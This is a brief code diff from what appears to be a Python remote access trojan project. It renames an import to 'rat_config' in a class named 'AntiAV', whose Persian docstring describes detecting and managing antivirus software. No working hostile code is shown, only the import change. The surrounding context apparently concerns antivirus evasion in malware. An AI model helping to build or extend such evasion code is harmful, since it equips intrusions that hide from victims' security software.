@@ -4,7 +4,7 @@ import subprocess
 import logging
 import platform
 from typing import List, Dict
-from config import Config
+from rat_config import Config
 
 class AntiAV:
     """ماژول برای تشخیص و مدیریت آنتی‌ویروس‌ها"""
